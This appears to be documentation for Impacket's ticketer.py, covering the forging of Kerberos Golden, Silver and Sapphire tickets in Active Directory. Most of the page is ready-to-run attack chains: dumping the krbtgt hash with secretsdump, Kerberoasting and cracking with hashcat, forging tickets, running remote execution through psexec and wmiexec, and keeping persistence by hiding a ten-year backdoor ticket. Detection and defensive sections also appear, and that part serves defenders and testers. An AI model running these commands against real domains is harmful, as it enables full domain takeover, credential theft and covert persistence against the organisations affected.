# ticketer.py

## Overview
`ticketer.py` is a powerful Kerberos ticket forging tool that creates TGT/TGS tickets from scratch or based on templates. This tool is essential for creating Golden and Silver tickets in Active Directory environments, enabling privilege escalation and lateral movement attacks.

## Detailed Description
This script creates forged Kerberos tickets (Golden and Silver tickets) that can be used for privilege escalation and lateral movement in Active Directory environments. The tool can create tickets from scratch using domain secrets or clone existing tickets with modifications. It allows customization of PAC_LOGON_INFO structure parameters including groups, extrasids, and user attributes.

**Golden Tickets**: Forged TGTs created using the krbtgt account hash, providing domain-wide access
**Silver Tickets**: Forged TGS tickets for specific services, useful for targeted attacks

### Key Features:
- **Golden Ticket Creation**: Generate domain-wide access tickets using krbtgt hash
- **Silver Ticket Creation**: Create service-specific tickets for targeted attacks
- **PAC Customization**: Modify groups, user IDs, and extra SIDs in ticket PAC
- **Template Cloning**: Request legitimate tickets and modify them
- **Multiple Encryption**: Support for RC4, AES128, and AES256 encryption
- **Sapphire Ticket Support**: Advanced impersonation through S4U2Self+U2U

### Technical Details:
- Creates tickets with 10-year default validity (customizable)
- Supports both offline (from scratch) and online (template-based) generation
- Implements PAC_LOGON_INFO structure manipulation
- Compatible with ccache format for ticket storage
- Supports various encryption algorithms based on provided keys

## Command Line Options

```
usage: ticketer.py [-h] [-spn SPN] [-request] -domain DOMAIN -domain-sid DOMAIN_SID [-aesKey hex key] [-nthash NTHASH]
                   [-keytab KEYTAB] [-groups GROUPS] [-user-id USER_ID] [-extra-sid EXTRA_SID] [-extra-pac] [-old-pac]
                   [-duration DURATION] [-ts] [-debug] [-user USER] [-password PASSWORD] [-hashes LMHASH:NTHASH]
                   [-dc-ip ip address] [-impersonate IMPERSONATE]
                   target

Creates a Kerberos golden/silver tickets based on user options

Required Arguments:
  target                Username for the newly created ticket
  -domain DOMAIN        The fully qualified domain name (e.g. contoso.com)
  -domain-sid DOMAIN_SID Domain SID of the target domain

Ticket Type:
  -spn SPN              SPN (service/server) for silver ticket. If omitted, golden ticket created

Encryption Keys (choose one):
  -aesKey hex key       AES key for signing the ticket (128 or 256 bits)
  -nthash NTHASH        NT hash for signing the ticket
  -keytab KEYTAB        Read keys for SPN from keytab file (silver ticket only)

PAC Customization:
  -groups GROUPS        Comma separated list of groups (default: 513,512,520,518,519)
  -user-id USER_ID      User ID for the ticket (default: 500)
  -extra-sid EXTRA_SID  Comma separated list of ExtraSids for ticket PAC
  -extra-pac            Populate ticket with extra PAC (UPN_DNS)
  -old-pac              Use old PAC structure (exclude PAC_ATTRIBUTES_INFO and PAC_REQUESTOR)

Template Mode:
  -request              Request ticket from domain and clone it (requires -user)
  -impersonate IMPERSONATE  Sapphire ticket - impersonate user through S4U2Self+U2U

General Options:
  -duration DURATION    Hours until ticket expires (default: 24*365*10)
  -ts                   Add timestamp to logging output
  -debug                Turn DEBUG output ON

Authentication (for -request mode):
  -user USER            Domain/username for ticket request
  -password PASSWORD    Password for domain/username
  -hashes LMHASH:NTHASH NTLM hashes for authentication
  -dc-ip ip address     Domain controller IP address
```
## Usage Examples

### Golden Ticket Creation
```bash
# Basic golden ticket with RC4 encryption
python3 ticketer.py -nthash a87f3a337d73085c45f9416be5787d86 -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local administrator

# Golden ticket with AES256 encryption
python3 ticketer.py -aesKey 18e4be92b43c37137228c0ffa8212d04 -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local administrator

# Golden ticket with custom groups and extra SIDs
python3 ticketer.py -nthash a87f3a337d73085c45f9416be5787d86 -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -groups 512,513,518,519 -extra-sid S-1-5-21-1339291983-1349129144-367733775-1001 administrator

# Golden ticket with custom duration (1 year)
python3 ticketer.py -nthash a87f3a337d73085c45f9416be5787d86 -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -duration 8760 administrator
```

### Silver Ticket Creation
```bash
# Silver ticket for CIFS service
python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -spn cifs/server.contoso.local administrator

# Silver ticket for HTTP service
python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -spn http/web.contoso.local administrator

# Silver ticket with keytab file
python3 ticketer.py -keytab service.keytab -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -spn mssql/db.contoso.local administrator
```

### Template-Based Ticket Creation
```bash
# Request legitimate ticket and modify it
python3 ticketer.py -request -domain contoso.local -user validuser -password Password123! -domain-sid S-1-5-21-1339291983-1349129144-367733775 -nthash a87f3a337d73085c45f9416be5787d86 targetuser

# Template with both NT hash and AES key
python3 ticketer.py -request -domain contoso.local -user validuser -password Password123! -domain-sid S-1-5-21-1339291983-1349129144-367733775 -nthash a87f3a337d73085c45f9416be5787d86 -aesKey 18e4be92b43c37137228c0ffa8212d04 targetuser
```

### Sapphire Ticket (Advanced Impersonation)
```bash
# Create sapphire ticket for impersonation
python3 ticketer.py -nthash a87f3a337d73085c45f9416be5787d86 -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain contoso.local -impersonate administrator targetuser
```

### Using Created Tickets
```bash
# Export the ticket to environment
export KRB5CCNAME=administrator.ccache

# Use with other Impacket tools
python3 psexec.py -k -no-pass contoso.local/administrator@dc.contoso.local
python3 secretsdump.py -k -no-pass contoso.local/administrator@dc.contoso.local
```

## Attack Chain Integration

### Golden Ticket Attack Chain
```bash
# Step 1: Obtain krbtgt hash via DCSync or secretsdump
python3 secretsdump.py contoso.local/admin:password@dc.contoso.local

# Step 2: Create golden ticket with extracted krbtgt hash
python3 ticketer.py -nthash [krbtgt_hash] -domain-sid S-1-5-21-xxx -domain contoso.local administrator

# Step 3: Use golden ticket for domain access
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass contoso.local/administrator@dc.contoso.local
```

### Silver Ticket Attack Chain
```bash
# Step 1: Obtain service account hash
python3 GetUserSPNs.py contoso.local/user:password -request -outputfile hashes.txt

# Step 2: Crack the service account hash
hashcat -m 13100 hashes.txt wordlist.txt

# Step 3: Create silver ticket for specific service
python3 ticketer.py -nthash [service_hash] -domain-sid S-1-5-21-xxx -domain contoso.local -spn cifs/server.contoso.local administrator

# Step 4: Use silver ticket for service access
export KRB5CCNAME=administrator.ccache
python3 smbclient.py -k -no-pass contoso.local/administrator@server.contoso.local
```

### Persistence with Golden Tickets
```bash
# Step 1: Create long-lasting golden ticket (10 years default)
python3 ticketer.py -nthash [krbtgt_hash] -domain-sid S-1-5-21-xxx -domain contoso.local backdoor_user

# Step 2: Store ticket in hidden location
cp backdoor_user.ccache /tmp/.hidden_ticket

# Step 3: Use for persistent access
export KRB5CCNAME=/tmp/.hidden_ticket
python3 wmiexec.py -k -no-pass contoso.local/backdoor_user@target.contoso.local
```

### Cross-Domain Attacks
```bash
# Step 1: Create golden ticket for parent domain
python3 ticketer.py -nthash [parent_krbtgt] -domain-sid S-1-5-21-parent -domain parent.local -extra-sid S-1-5-21-child-519 administrator

# Step 2: Use ticket to access child domain resources
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass child.local/administrator@childdc.child.local
```

## Prerequisites
- Python 3.x with Impacket installed
- Domain SID of the target domain
- One of the following:
  - krbtgt account NT hash (for golden tickets)
  - Service account NT hash or AES key (for silver tickets)
  - Valid domain credentials (for template-based tickets)
- Knowledge of target domain structure and services

## Detection Considerations
- **Event IDs**:
  - 4768: Kerberos TGT request (unusual patterns)
  - 4769: Kerberos service ticket request
  - 4624: Account logon (with unusual ticket characteristics)
  - 4672: Special privileges assigned (admin rights)
- **Ticket Indicators**:
  - Tickets with unusual lifetimes (10 years default)
  - Service tickets requested without prior TGT
  - Tickets with non-standard group memberships
  - Accounts logging in from unusual locations
- **PAC Anomalies**:
  - Modified group memberships
  - Unusual Extra SIDs
  - PAC validation failures

## Defensive Measures
- **Krbtgt Management**:
  - Regular krbtgt password rotation (twice within domain password history)
  - Monitor krbtgt account usage and access
  - Implement krbtgt account alerts
- **Service Account Security**:
  - Use managed service accounts where possible
  - Regular service account password rotation
  - Monitor service account usage patterns
- **Kerberos Monitoring**:
  - Log and analyze all Kerberos events
  - Implement ticket lifetime monitoring
  - Deploy Kerberos security monitoring tools
- **Network Security**:
  - Implement network segmentation
  - Monitor for unusual authentication patterns
  - Deploy behavioral analysis tools

## Common Issues and Troubleshooting

### Clock Skew Issues
```bash
# Error: KRB_AP_ERR_SKEW
# Solution: Synchronize time with domain controller
ntpdate dc.contoso.local

# Or use ntpdate with specific server
ntpdate -s time.nist.gov
```

### Encryption Type Mismatches
```bash
# Issue: Ticket encryption doesn't match domain policy
# Solution: Use matching encryption type
python3 ticketer.py -aesKey [aes_key] -domain-sid S-1-5-21-xxx -domain contoso.local user
# Instead of RC4 when domain enforces AES
```

### Invalid Domain SID
```bash
# Issue: "Invalid SID" or access denied
# Solution: Obtain correct domain SID
python3 lookupsid.py contoso.local/user:password@dc.contoso.local | grep "Domain SID"
```

### PAC Validation Failures
```bash
# Issue: PAC signature validation fails
# Solution: Use correct signing keys or disable PAC validation
python3 ticketer.py -old-pac -nthash [hash] -domain-sid S-1-5-21-xxx -domain contoso.local user
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Extract krbtgt and service account hashes
- [GetUserSPNs.py](GetUserSPNs.md) - Discover and attack service accounts
- [psexec.py](psexec.md) - Execute commands with forged tickets
- [wmiexec.py](wmiexec.md) - WMI execution with Kerberos tickets
- [smbclient.py](smbclient.md) - SMB access with tickets
- [describeTicket.py](describeTicket.md) - Analyze created tickets
- [ticketConverter.py](ticketConverter.md) - Convert between ticket formats

---

*This documentation is based on the actual source code and functionality of ticketer.py from Impacket.*
